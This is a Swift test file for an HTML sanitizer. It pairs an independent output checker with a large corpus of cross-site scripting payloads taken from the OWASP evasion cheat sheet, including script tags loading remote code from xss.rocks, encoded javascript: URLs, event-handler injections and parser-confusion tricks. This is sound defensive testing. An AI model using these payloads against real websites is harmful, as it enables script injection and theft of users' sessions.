import Foundation
import Testing

@testable import MdvCore

// MARK: - Independent output checker

/// Checks sanitizer output without using the sanitizer's own tokenizer or policy code.
///
/// Sanitized output escapes `<` and `>` everywhere except in tags it writes, so every `<…>`
/// span is a tag, and each must match a strict `<name attr="value">` grammar.
enum OutputChecker {
    static let elements: Set<String> = [
        "h1", "h2", "h3", "h4", "h5", "h6", "br", "b", "i", "strong", "em", "a", "pre", "code", "img", "tt", "div",
        "ins", "del", "sup", "sub", "p", "picture", "ol", "ul", "table", "thead", "tbody", "tfoot", "blockquote",
        "dl", "dt", "dd", "kbd", "q", "samp", "var", "hr", "ruby", "rt", "rp", "li", "tr", "td", "th", "s",
        "strike", "summary", "details", "caption", "figure", "figcaption", "abbr", "bdo", "cite", "dfn", "mark",
        "small", "source", "span", "time", "wbr",
    ]
    static let urlAttributes: Set<String> = ["href", "src", "cite", "longdesc", "srcset"]

    // Scalar semantics: a combining mark or ZWJ after `"` would otherwise merge with it.
    nonisolated(unsafe) static let tagPattern = /^\/?([a-z0-9]+)((?: [a-z-]+(?:="[^"<>]*")?)*)( \/)?$/
        .matchingSemantics(.unicodeScalar)
    nonisolated(unsafe) static let attributePattern = /\ ([a-z-]+)(?:="([^"]*)")?/.matchingSemantics(.unicodeScalar)

    /// Problems found in `html`; empty when it is safe. Markdown links and autolinks may use
    /// any scheme cmark's safe mode allows, so `isMarkdown` checks only for dangerous schemes.
    /// `extraElements` allows elements only the renderer writes (e.g. the footnotes `section`).
    static func problems(in html: String, isMarkdown: Bool = false, extraElements: Set<String> = []) -> [String] {
        var problems: [String] = []
        if html.lowercased().contains("<script") {
            problems.append("contains <script")
        }
        // Scan Unicode scalars, as an HTML tokenizer does: a combining mark after `>` would merge
        // with it into one `Character`.
        var rest = Substring(html).unicodeScalars
        while let open = rest.firstIndex(of: "<") {
            guard let close = rest[open...].firstIndex(of: ">") else {
                problems.append("unterminated tag")
                break
            }
            let tag = Substring(rest[rest.index(after: open)..<close])
            rest = rest[rest.index(after: close)...]
            guard let match = tag.wholeMatch(of: tagPattern) else {
                problems.append("malformed tag <\(tag)>")
                continue
            }
            if !elements.contains(String(match.1)), !extraElements.contains(String(match.1)) {
                problems.append("element <\(match.1)>")
            }
            for attribute in match.2.matches(of: attributePattern) {
                let name = String(attribute.1)
                if name.hasPrefix("on") || name == "style" {
                    problems.append("attribute \(name)")
                }
                if urlAttributes.contains(name), let value = attribute.2,
                    !isSafeURL(String(value), anyScheme: isMarkdown)
                {
                    problems.append("URL \(name)=\"\(value)\"")
                }
            }
        }
        return problems
    }

    /// Decodes numeric references and the named ones that matter for schemes, strips
    /// whitespace and controls, and requires an allowed scheme or none.
    static func isSafeURL(_ value: String, anyScheme: Bool) -> Bool {
        var decoded = value
        for (name, replacement) in [("colon", ":"), ("tab", "\t"), ("newline", "\n"), ("sol", "/"), ("amp", "&")] {
            decoded = decoded.replacingOccurrences(of: "&\(name);", with: replacement, options: .caseInsensitive)
        }
        decoded = decoded.replacing(/&#(x?)([0-9a-f]+);?/.ignoresCase()) { match in
            let code = UInt32(match.2, radix: match.1.isEmpty ? 10 : 16).flatMap(Unicode.Scalar.init)
            return code.map { String(Character($0)) } ?? "\u{FFFD}"
        }
        let compact = String(decoded.unicodeScalars.filter { $0.value > 0x20 && $0.value != 0x7F }).lowercased()
        for dangerous in ["javascript:", "vbscript:", "data:", "file:"] where compact.hasPrefix(dangerous) {
            return false
        }
        guard !anyScheme, let colon = compact.firstIndex(of: ":") else {
            return true
        }
        let beforeColon = compact[..<colon]
        if beforeColon.contains(where: { "/?#".contains($0) }) {
            return true
        }
        return ["http", "https", "mailto"].contains(String(beforeColon))
    }
}

// MARK: - XSS corpus

/// Patterns from the OWASP XSS Filter Evasion Cheat Sheet
/// (https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html), plus
/// comment and parser-differential tricks.
let xssCorpus: [String] = [
    "<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>",
    #"javascript:/*--></title></style></textarea></script></xmp>"#
        + #"<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>"#,
    #"<IMG SRC="javascript:alert('XSS');">"#,
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
    #"<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>"#,
    #"<a onmouseover="alert(document.cookie)">xxs link</a>"#,
    "<a onmouseover=alert(document.cookie)>xxs link</a>",
    #"<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>"#,
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    #"<IMG SRC=# onmouseover="alert('xxs')">"#,
    #"<IMG SRC= onmouseover="alert('xxs')">"#,
    #"<IMG onmouseover="alert('xxs')">"#,
    #"<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>"#,
    "<img src=x onerror=\"\(references("javascript:alert('XSS')", format: "&#%07d"))\">",
    "<IMG SRC=\(references("javascript:alert('XSS')", format: "&#%d;"))>",
    "<IMG SRC=\(references("javascript:alert('XSS')", format: "&#%07d"))>",
    "<IMG SRC=\(references("javascript:alert('XSS')", format: "&#x%X"))>",
    "<IMG SRC=\"jav\tascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
    "<IMG SRC=java\u{0}script:alert(\"XSS\")>",
    "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
    #"<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>"#,
    #"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>"#,
    #"<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>"#,
    #"<<SCRIPT>alert("XSS");//\<</SCRIPT>"#,
    "<SCRIPT SRC=http://xss.rocks/xss.js?< B >",
    "<SCRIPT SRC=//xss.rocks/.j>",
    #"<IMG SRC="`<javascript:alert>`('XSS')""#,
    "<iframe src=http://xss.rocks/scriptlet.html <",
    #"</TITLE><SCRIPT>alert("XSS");</SCRIPT>"#,
    #"<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">"#,
    #"<BODY BACKGROUND="javascript:alert('XSS')">"#,
    #"<IMG DYNSRC="javascript:alert('XSS')">"#,
    #"<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>"#,
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(1)><circle/></svg>",
    #"<BR SIZE="&{alert('XSS')}">"#,
    #"<LINK REL="stylesheet" HREF="javascript:alert('XSS');">"#,
    #"<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">"#,
    #"<IFRAME SRC="javascript:alert('XSS');"></IFRAME>"#,
    #"<TABLE BACKGROUND="javascript:alert('XSS')"><TD BACKGROUND="javascript:alert('XSS')">"#,
    #"<DIV STYLE="background-image: url(javascript:alert('XSS'))">"#,
    #"<DIV STYLE="width: expression(alert('XSS'));">"#,
    "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
    #"<BASE HREF="javascript:alert('XSS');//">"#,
    #"<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>"#,
    #"<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4"></EMBED>"#,
    #"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>"#,
    #"<a href="&#x6A;avascript:alert(1)">x</a>"#,
    #"<a href="jav&Tab;ascript:alert(1)">x</a>"#,
    #"<a href="javascript&colon;alert(1)">x</a>"#,
    #"<a href="javascript&#58alert(1)">x</a>"#,
    #"<a href="vbscript:msgbox(1)">x</a>"#,
    #"<a href="  JAVASCRIPT:alert(1)">x</a>"#,
    #"<a href="java&NewLine;script:alert(1)">x</a>"#,
    #"<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58alert(1)">x</a>"#,
    #"<a href="j&#x0000000000061;vascript:alert(1)">x</a>"#,
    #"<a href="\u{1}javascript:alert(1)">x</a>"#,
    #"<img alt="</script><script>alert(1)</script>" src="x">"#,
    #"<img src="x" alt='"><script>alert(1)</script>'>"#,
    #"<a title="</a><script>alert(1)</script>">x</a>"#,
    "<!-- --!><script>alert(1)</script> -->",
    "<!--><script>alert(1)</script>-->",
    "<!---><script>alert(1)</script>-->",
    "<! <script>alert(1)</script> >",
    "<?xml <script>alert(1)</script> ?>",
    "<![CDATA[<script>alert(1)</script>]]>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>script>alert(1)<</script>/script>",
    "<script\n>alert(1)</script\n>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script>/* </script\t> */alert(1)</script>",
    "<textarea><script>alert(1)</script></textarea>",
    "<title><script>alert(1)</script></title>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
    "<template><script>alert(1)</script></template>",
    "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
    "<form action=javascript:alert(1)><button>x</button></form>",
    "<details open ontoggle=alert(1)><summary>x</summary></details>",
    "<a/href=javascript:alert(1)>x</a>",
    "<img/src=x/onerror=alert(1)>",
    "<img src=x\u{0}onerror=alert(1)>",
    "<img src=x\u{C}onerror=alert(1)>",
    "<img \"src=x onerror=alert(1)\">",
    "<img src='x'onerror=alert(1)>",
    "<a href=\"javascript:alert(1)\"",
    "<source srcset=\"x.png 1x, javascript:alert(1) 2x\">",
    "<img longdesc=javascript:alert(1)>",
    "<blockquote cite=javascript:alert(1)>q</blockquote>",
    "<div style=\"x\" class=\"y\" data-x=\"z\" onclick=\"alert(1)\">d</div>",
]

/// Writes each character of `text` as a numeric character reference in `format`.
private func references(_ text: String, format: String) -> String {
    text.unicodeScalars.map { String(format: format, $0.value) }.joined()
}
